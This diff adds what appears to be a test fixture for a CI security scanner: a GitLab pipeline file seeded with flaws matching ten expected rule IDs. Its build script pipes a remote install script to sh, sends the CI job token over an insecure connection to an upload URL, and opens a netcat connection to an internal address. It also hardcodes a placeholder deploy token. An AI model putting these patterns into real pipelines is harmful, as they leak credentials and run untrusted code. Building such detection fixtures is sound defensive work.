@@ -1,0 +1,23 @@
+# path: .gitlab-ci.yml
+# expect: TG-GITLAB-001, TG-GITLAB-002, TG-GITLAB-003, TG-GITLAB-004, TG-GITLAB-005, TG-GITLAB-006, TG-GITLAB-007, TG-GITLAB-008, TG-GITLAB-009, TG-GITLAB-010
+include:
+  - remote: https://example.com/ci/template.yml
+  - project: group/templates
+    file: /build.yml
+image: alpine
+variables:
+  DOCKER_TLS_CERTDIR: ""
+  DEPLOY_TOKEN:
+    value: glpat-abcdef123456
+    description: deploy token
+build:
+  image: docker:27.1
+  services:
+    - docker:27.1-dind
+  rules:
+    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
+    - if: $CI_PIPELINE_SOURCE == "push"
+  script:
+    - curl -sSL https://example.com/install.sh | sh
+    - 'curl --insecure -H "JOB-TOKEN: $CI_JOB_TOKEN" https://example.com/upload'
+    - nc 192.168.1.10 9001
